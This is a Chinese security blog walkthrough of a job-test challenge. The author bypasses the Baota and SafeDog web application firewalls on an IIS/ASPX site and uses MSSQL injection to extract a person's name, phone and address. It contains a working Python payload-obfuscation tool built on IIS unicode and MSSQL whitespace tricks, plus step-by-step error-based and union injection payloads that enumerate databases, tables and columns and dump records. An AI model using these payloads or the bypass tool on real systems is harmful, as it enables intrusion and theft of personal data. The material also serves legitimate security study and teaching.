## 前言

最近在准备找工作,有一家公司给我发来了这样一条消息,于是有了这篇文章.

本文涉及知识点实操练习：[SQL注入](https://www.hetianlab.com/expc.do?ec=ECID172.19.104.182015060916565800001&pk_campaign=freebuf-wemedia)（本实验以PHP和mysql为环境，简单展示了SQL的发生原理和利用过程，通过显错注入和盲注的对比，更直观展现注入的不同利用方法。）

因本文是bypass成功后,才写的可能会缺少一些图.(耗费本菜鸡半天时间,因为之前都是mysql搞的多,还有就是sqlmap一把梭.差点把传统手艺都丢了.)

![1611814821_601257a589565efbaf4b1.jpg!small](https://image.3001.net/images/20210128/1611814821_601257a589565efbaf4b1.jpg!small)

## 大意了,没有闪

拿到目标后,我就迫不及待地直接打开

![1611814822_601257a690b7fd7807126.png!small](https://image.3001.net/images/20210128/1611814822_601257a690b7fd7807126.png!small)

打开地址一看是报错的,我还以为任务是需要通过信息收集拿到shell,最后再拿数据.我还在想开局就送个信息泄漏?

最后折腾一番之后发现没什么突破口.回来再看之前的地址发现又能访问了.

大意了,没有闪

最后看到界面是这样的(能打开完全靠运气,特别是在晚上)

![1611814823_601257a77df61bbf73608.png!small](https://image.3001.net/images/20210128/1611814823_601257a77df61bbf73608.png!small)

看到这个界面后,我就知道,原来是想测老夫的sql注入? 我当时心想不会用sqlmap一把梭就进去了吧!

## 注入点识别

随即我就先用'试试注入点

    
    
    /1.aspx?id=1%27

![1611814824_601257a8206b9c2240a27.png!small](https://image.3001.net/images/20210128/1611814824_601257a8206b9c2240a27.png!small)

继续试试and 1=1

>
>     /1.aspx?id=1%20%27and%201=1

好小子,居然有狗小小的一条就能难到我?打开burp,开始手注

# bypass宝塔+安全狗

直接把请求改为post,试试垃圾数据填充能不能bypass

![1611814825_601257a99a21b74794449.png!small](https://image.3001.net/images/20210128/1611814825_601257a99a21b74794449.png!small)

生成垃圾数据

![1611814826_601257aa4f12e94342d00.png!small](https://image.3001.net/images/20210128/1611814826_601257aa4f12e94342d00.png!small)

好小子,还有个宝塔waf,看来垃圾数据填充已经不好用了

![1611814827_601257abbd1c742d84414.png!small](https://image.3001.net/images/20210128/1611814827_601257abbd1c742d84414.png!small)

再试试分块传输bypass

![1611814829_601257ad03576e369e62e.png!small](https://image.3001.net/images/20210128/1611814829_601257ad03576e369e62e.png!small)

还是一样(对分块传输没什么研究,和一些数据库特性结合应该还是可以用的,不是本文的重点)

接下来,开始fuzz

试试不带select

![1611814830_601257ae11342946b07a3.png!small](https://image.3001.net/images/20210128/1611814830_601257ae11342946b07a3.png!small)

发现可以,继续试试,user和db_name()

![1611814830_601257aed859b4fbe8df1.png!small](https://image.3001.net/images/20210128/1611814830_601257aed859b4fbe8df1.png!small)

![1611814831_601257afcb4a2f1deb523.png!small](https://image.3001.net/images/20210128/1611814831_601257afcb4a2f1deb523.png!small)

这说明宝塔和狗都是对select 后面跟值进行拦截

我们继续试试联合查询union

![image-20210124115528546](img/image-20210124115528546.png)

不出所料还是一样,这两兄弟好搭档啊,换着来.由于本文重点是在学习手注入和bypass下面开始bypass,我这边打算写个payload混淆工具bypass

在写工具前我们得知道bypass的常用手法有哪些吧?

我这边大概整理了有如下几种

  1. 利用服务器特性

  2. 利用数据库特性

  3. 利用WAF特性

所以为了更好的bypass,我们就得了解对这些特性有一定的了解,因为我的当前目标是iis+aspx,那我们就得了解一下iis和mssql特性来进行bypass

 **iis特性**

下面摘自 bypass大佬的waf攻防实战笔记

1、%特性(ASP+IIS)

在asp+iis的环境中存在一个特性,就是特殊符号%,在该环境下当们我输入s%elect的时候,在WAF层可能解析出来

的结果就是s%elect,但是在iis+asp的环境的时候,解析出来的结果为select。

Ps.此处猜测可能是iis下asp.dll解析时候的问题,aspx+iis的环境就没有这个特性。

2、%u特性(asp+iis和aspx+iis)

Iis服务器支持对于unicode的解析,例如我们对于select中的字符进行unicode编码,可以得到如下的

s%u006c%u0006ect ,这种字符在IIS接收到之后会被转换为select,但是对于WAF层,可能接收到的内容还是

s%u006c%u0006ect,这样就会形成bypass的可能。

3、另类%u特性(ASP+IIS)

该漏洞主要利用的是unicode在iis解析之后会被转换成multibyte,但是转换的过程中可能出现: 多个widechar会有

可能转换为同一个字符。
打个比方就是譬如select中的e对应的unicode为%u0065,但是%u00f0同样会被转换成为e。s%u0065lect->select
s%u00f0lect->selectWAF层可能能识别s%u0065lect的形式,但是很有可能识别不了s%u00f0lect的形式。这样就可以利用起来做WAF的绕过。常见三个关键字(union+select+from)的测试情况:

    
    
    s%u0045lect = s%u0065lect = %u00f0lect
    
    
    u --> %u0055 --> %u0075
    
    
    n -->%u004e --> %u006e
    
    
    i -->%u0049 --> %u0069
    
    
    o -->%u004f --> %u006f -->%u00ba
    
    
    s -->%u0053 --> %u0073
    
    
    l -->%u004c --> %u006c
    
    
    e -->%u0045 --> %u0065-->%u00f0
    
    
    c -->%u0043 --> %u0063
    
    
    t -->%u0054 -->%u0074 -->%u00de -->%u00fe
    
    
    f -->%u0046 -->%u0066
    
    
    r -->%u0052 -->%u0072
    
    
    m -->%u004d -->%u006d

 **mssql特性**

1\. 空白字符

Mssql可以利用的空白字符有(需要在字符前面加%):

    
    
    01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20

2\. 注释符

注释符可以用来代替空格,或者和--配合使用,--也可以配合%0a(注释加换行)

    
    
    /**/
    
    
    --    
    
    /**anything*/

3\. 特殊数值

一般用在注入点上

如1.1或者1E0这些

4\. 运算符

下面摘自 404大佬的MSSQL_SQL_BYPASS_WIKI

    
    
    +   加法运算
    
    
    -   减法运算
    
    
    *   乘法运算
    
    
    /   除法运算，如果两个表达式值都是整数，那么结果只取整数值，小数值将略去
    
    
    %   取模运算，返回两数相除后的余数
    
    
    &   位与逻辑运算，从两个表达式中取对应的位。当且仅当输入表达式中两个位的值都为1时，结果中的位才被设置为1，否则，结果中的位被设置为0
    
    
    |   位或逻辑运算，从两个表达式中取对应的位。如果输入表达式中两个位只要有一个的值为1时，结果的位就被设置为1，只有当两个位的值都为0时，结果中的位才被设置为0
    
    
    ^   位异或运算，从两个表达式中取对应的位。如果输入表达式中两个位只有一个的值为1时，结果中的位就被设置为1；只有当两个位的值都为0或1时，结果中的位才被设置为0
    
    
    =   等于
    
    
    <>  不等于
    
    
    >   大于
    
    
    !=  不等于
    
    
    <   小于
    
    
    !<  不小于
    
    
    >=  大于或等于
    
    
    !>  不大于
    
    
    <=  小于或等于
    
    
    ALL 如果一组的比较都为true，则比较结果为true
    
    
    AND 如果两个布尔表达式都为true，则结果为true；如果其中一个表达式为false，则结果为false
    
    
    ANY 如果一组的比较中任何一个为true，则结果为true
    
    
    BETWEEN 如果操作数在某个范围之内，那么结果为true
    
    
    EXISTS  如果子查询中包含了一些行，那么结果为true
    
    
    IN  如果操作数等于表达式列表中的一个，那么结果为true
    
    
    LIKE    如果操作数与某种模式相匹配，那么结果为true
    
    
    NOT 对任何其他布尔运算符的结果值取反
    
    
    OR  如果两个布尔表达式中的任何一个为true，那么结果为true
    
    
    SOME    如果在一组比较中，有些比较为true，那么结果为true

当我们了解完这些特性之后,直接开干,随即就打开了老夫的pycharm

下面直接省略测试过程的图片,大家可以手工测也可以用intruder来跑.fuzz是个漫长的过程,我这里只可以大家提供思路

先把空白字符和注释定义出来(经测试发现+也有同等效果)

![1611814832_601257b08acbbe3e2c616.png!small](https://image.3001.net/images/20210128/1611814832_601257b08acbbe3e2c616.png!small)

1.先把所有的空格都用注释替换

![1611814833_601257b13f8533a563fc2.png!small](https://image.3001.net/images/20210128/1611814833_601257b13f8533a563fc2.png!small)

2.对and和where进行处理,在它们前后随机加空白符,用来混淆这两个关键字

![1611814833_601257b1d9f052c115581.png!small](https://image.3001.net/images/20210128/1611814833_601257b1d9f052c115581.png!small)

3.利用iis特性对下面这几个关键字某个字符用unicode编码替换

![1611814834_601257b276acad48063c4.png!small](https://image.3001.net/images/20210128/1611814834_601257b276acad48063c4.png!small)

4.对下面这几个符合进行处理,

1.在某些函数会被拦截用+()来bypass

2.查询某某库的某某表如admin.user会被拦截,用+.来bypass

![image-20210124134907260](img/image-20210124134907260.png)

5.最后拓展下payload接收.最终代码如下

    
    
    import random
    
    
    def bypass(payload):
    
    
    chars1 = ['%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0A', '%0B', '%0C', '%0D', '%0E', '%0F',
    
    
    '%10', '%11','%12', '%13', '%14', '%15', '%16', '%17', '%18', '%19', '%1A', '%1B', '%1C', '%1D', '%1E',
    
    
    '%1F', '%20']
    
    
    chars2 = ["/**/", "/*!*/", "/*!safe6*/", "+"]
    
    
    v = random.choice(chars1)
    
    
    payload = payload.replace(" ", random.choice(chars2))
    
    
    payload = payload.replace("=", v + "=" + v)
    
    
    payload = payload.replace("AND", v + "AND" + v)
    
    
    payload = payload.replace("and", v + "AND" + v)
    
    
    payload = payload.replace("WHERE", v + "WHERE" + v)
    
    
    payload = payload.replace("where", v + "where" + v)
    
    
    payload = payload.replace("UNION", "u%u006eion")
    
    
    payload = payload.replace("union", "u%u006eion")
    
    
    payload = payload.replace("CHAR", "%u0063har")
    
    
    payload = payload.replace("char", "%u0063har")
    
    
    payload = payload.replace("SELECT", "se%u006cect")
    
    
    payload = payload.replace("select", "se%u006cect")
    
    
    payload = payload.replace("FROM", "%u0066rom")
    
    
    payload = payload.replace("from", "%u0066rom")
    
    
    payload = payload.replace("(", "+(")
    
    
    payload = payload.replace(".", ".+")
    
    
    payload = payload.replace("--", "/*!*/--")
    
    
    print(payload)
    
    
    if __name__ == '__main__':
    
    
    while True:
    
    
    payload = input("输入payload:")
    
    
    if payload == 'q':
    
    
    exit(0)
    
    
    if payload:
    
    
    bypass(payload)

已经打包上传github

地址:<https://github.com/safe6Sec/bypassWAF>

然后就可以愉快的手注了

## mssql手注

从前期的来看,该注入点支持union注入和报错注入.我这边采用报错注入.

用union注入需要知道当前表有几列(和mysql一样用order by判断),还需要回显点

用报错注入主要是用top命令配合not in来进行注入

爆库(mssql默认有四个库,我们需要加个条件,dbid>4)

    
    
    and (SELECT top 1 Name FROM Master..SysDatabases where dbid>4)>0

![1611814835_601257b32db93883224ec.png!small](https://image.3001.net/images/20210128/1611814835_601257b32db93883224ec.png!small)

![1611814835_601257b3c7224b3d393ce.png!small](https://image.3001.net/images/20210128/1611814835_601257b3c7224b3d393ce.png!small)

这样只是爆出第一个库,爆别的还需用not in来配合排除已知的表

用union联合查询结果如下(列数量要和当前表一致,没有的列用null占位)

    
    
    union SELECT null,null,null,Name,null,null,null,null  FROM Master..SysDatabases

![1611814836_601257b4a3aab9b2e399f.png!small](https://image.3001.net/images/20210128/1611814836_601257b4a3aab9b2e399f.png!small)

从上面的数据可以看出,只有一个数据库

继续爆表

    
    
    and (select top 1 name from a999.sys.all_objects where type='U' AND is_ms_shipped=0)>0

![1611814837_601257b57dbe5633c4350.png!small](https://image.3001.net/images/20210128/1611814837_601257b57dbe5633c4350.png!small)

第一张表为a999,用not in排除这张表继续爆其他的

    
    
    and (select top 1 name from a999.sys.all_objects where type='U' AND is_ms_shipped=0 and name not in ('a999'))>0

以此内推

最后得了下面这些表

'dtproperties','a999','wap_album','wap_albumre','admin','wap_bankLog','wap_bbs','wap_bbs_MarkSix','wap_bbs_MarkSix_bet','D99_CMD','temp','wap_background'

直觉告诉我数据很有可能是在a999(从名字上判断)

直接爆字段,和爆表一样的操作

    
    
    and 1=(select top 1 name from syscolumns whereid=(select id from sysobjects where name = 'a999') )

得到了这些字段

'id','siteid','airplaneid','airplanename','userid','username','num','tel','address','starttime','content','remark','addtime','state'

他们要的数据是:序号10的 那栏信息。包含 名字 电话 地址

开始跑数据

    
    
    and 1=(select top 1 username from a999 where id=10)

![1611814838_601257b64dffe33c80a59.png!small](https://image.3001.net/images/20210128/1611814838_601257b64dffe33c80a59.png!small)

然后继续把剩下的电话地址跑出来,上交收工.

![1611814839_601257b7392320dad065f.png!small](https://image.3001.net/images/20210128/1611814839_601257b7392320dad065f.png!small)

fuzz真是挺废时间了,本文是在bypass成功后所写.过程耗费太多时间没截图,思路都告诉大家了.结合起来用即可.

或者会有大佬想说为什么不,写个tamper来跑,

最后感谢404和bypass大佬的文章,小弟受益良多.

# 总结

  1. 不要光说不做,实操才是真理

  2. 对waf的bypass也就那样,把规则搞清楚了就很简单,免杀也如此

  3. union注入比报错注入香多了

